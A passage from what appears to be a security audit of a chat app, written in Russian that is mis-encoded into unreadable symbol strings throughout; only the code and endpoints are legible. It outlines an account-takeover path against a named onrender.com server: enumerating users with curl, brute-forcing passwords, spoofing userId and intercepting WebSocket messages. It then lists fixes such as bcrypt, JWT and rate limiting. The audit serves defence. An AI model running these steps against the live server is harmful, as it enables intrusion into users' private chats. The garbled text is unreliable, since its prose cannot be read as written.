| CORS –æ—Ç–∫—Ä—ã—Ç | üü° –í—ã—Å–æ–∫–∞—è | ‚≠ê –õ–µ–≥–∫–æ | CSRF –∞—Ç–∞–∫–∏ |
| WebSocket –±–µ–∑ auth | üî¥ –ö—Ä–∏—Ç–∏—á–Ω–æ | ‚≠ê‚≠ê –°—Ä–µ–¥–Ω–µ | –ü–µ—Ä–µ—Ö–≤–∞—Ç —Å–æ–æ–±—â–µ–Ω–∏–π |
| –ü–∞—Ä–æ–ª–∏ –≤ –ª–æ–≥–∞—Ö | üî¥ –ö—Ä–∏—Ç–∏—á–Ω–æ | ‚≠ê –õ–µ–≥–∫–æ | –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø |
| –ü—É–±–ª–∏—á–Ω—ã–π —Å–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π | üü° –°—Ä–µ–¥–Ω—è—è | ‚≠ê –õ–µ–≥–∫–æ | –£—Ç–µ—á–∫–∞ –¥–∞–Ω–Ω—ã—Ö |
| –ù–µ—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ | üü° –°—Ä–µ–¥–Ω—è—è | ‚≠ê‚≠ê –°—Ä–µ–¥–Ω–µ | –†–∞–∑–ª–∏—á–Ω—ã–µ –∞—Ç–∞–∫–∏ |

---

## üéØ –†–µ–∞–ª—å–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π –≤–∑–ª–æ–º–∞

### –°—Ü–µ–Ω–∞—Ä–∏–π: –ü–æ–ª–Ω—ã–π –∫–æ–º–ø—Ä–æ–º–∏—Å—Å –∞–∫–∫–∞—É–Ω—Ç–∞

1. **–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏:**
   ```bash
   curl https://my-server-chat.onrender.com/auth/users
   # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
   ```

2. **–ë—Ä—É—Ç—Ñ–æ—Ä—Å –ø–∞—Ä–æ–ª—è:**
   ```python
   # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–æ–¥–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π –¥–ª—è user@mail.com
   # –ù–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π - –º–æ–∂–Ω–æ –ø—Ä–æ–±–æ–≤–∞—Ç—å —Ç—ã—Å—è—á–∏ —Ä–∞–∑
   ```

3. **–í—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É:**
   ```bash
   POST /auth/login
   {"email": "user@mail.com", "password": "–Ω–∞–π–¥–µ–Ω–Ω—ã–π_–ø–∞—Ä–æ–ª—å"}
   ```

4. **–ü–æ–¥–º–µ–Ω–∞ userId:**
   ```dart
   // –ò–∑–º–µ–Ω–∏—Ç—å SharedPreferences –Ω–∞ –¥—Ä—É–≥–æ–π userId
   // –¢–µ–ø–µ—Ä—å –¥–æ—Å—Ç—É–ø –∫ —á—É–∂–∏–º —á–∞—Ç–∞–º
   ```

5. **–ü–µ—Ä–µ—Ö–≤–∞—Ç —Å–æ–æ–±—â–µ–Ω–∏–π —á–µ—Ä–µ–∑ WebSocket:**
   ```javascript
   // –ü–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è —Å –ø–æ–¥–º–µ–Ω–µ–Ω–Ω—ã–º userId
   // –ü–æ–ª—É—á–∏—Ç—å –≤—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è
   ```

**–í—Ä–µ–º—è –≤–∑–ª–æ–º–∞:** 10-30 –º–∏–Ω—É—Ç –¥–ª—è –æ–ø—ã—Ç–Ω–æ–≥–æ —Ö–∞–∫–µ—Ä–∞

---

## üõ°Ô∏è –ö–∞–∫ –∏—Å–ø—Ä–∞–≤–∏—Ç—å (–ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç—ã)

### –ö—Ä–∏—Ç–∏—á–Ω–æ (—Å–¥–µ–ª–∞—Ç—å –°–ï–ô–ß–ê–°):

1. **–•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π:**
   ```javascript
   const bcrypt = require('bcrypt');
   const hashedPassword = await bcrypt.hash(password, 10);
   ```

2. **JWT —Ç–æ–∫–µ–Ω—ã:**
   ```javascript
   const jwt = require('jsonwebtoken');
   const token = jwt.sign({ userId, email }, SECRET_KEY);
   ```

3. **Rate limiting:**
   ```javascript
   const rateLimit = require('express-rate-limit');
   app.use('/auth/login', rateLimit({ max: 5, windowMs: 15 * 60 * 1000 }));
   ```

4. **–£–±—Ä–∞—Ç—å –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π:**
   ```javascript
   console.log('Login attempt:', { email });  // –ë–µ–∑ –ø–∞—Ä–æ–ª—è!
   ```

### –í—ã—Å–æ–∫–∏–π –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç:

5. **–û–≥—Ä–∞–Ω–∏—á–∏—Ç—å CORS:**
   ```javascript
   app.use(cors({ origin: 'https://yourdomain.com' }));
   ```

6. **–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è WebSocket:**
   ```javascript
   // –ü—Ä–æ–≤–µ—Ä—è—Ç—å JWT —Ç–æ–∫–µ–Ω –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
   ```

7. **–í–∞–ª–∏–¥–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö:**
   ```javascript
   // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ email, –¥–ª–∏–Ω—ã –ø–∞—Ä–æ–ª—è –∏ —Ç.–¥.
   ```

---

## ‚ö†Ô∏è –í–ê–ñ–ù–û

**–≠—Ç–æ—Ç –¥–æ–∫—É–º–µ–Ω—Ç —Å–æ–∑–¥–∞–Ω –¥–ª—è:**
- ‚úÖ –ü–æ–Ω–∏–º–∞–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
- ‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø—Ä–æ–±–ª–µ–º
- ‚úÖ –£–ª—É—á—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

**–ù–ï –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –¥–ª—è:**
- ‚ùå –í–∑–ª–æ–º–∞ —á—É–∂–∏—Ö —Å–∏—Å—Ç–µ–º
- ‚ùå –ù–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
- ‚ùå –õ—é–±—ã—Ö –Ω–µ–∑–∞–∫–æ–Ω–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —ç—Ç–∏—Ö –º–µ—Ç–æ–¥–æ–≤ –¥–ª—è –≤–∑–ª–æ–º–∞ —á—É–∂–∏—Ö —Å–∏—Å—Ç–µ–º —è–≤–ª—è–µ—Ç—Å—è –Ω–µ–∑–∞–∫–æ–Ω–Ω—ã–º!**

---

*–î–∞—Ç–∞ —Å–æ–∑–¥–∞–Ω–∏—è: 2024*
*–í–µ—Ä—Å–∏—è: 1.0*

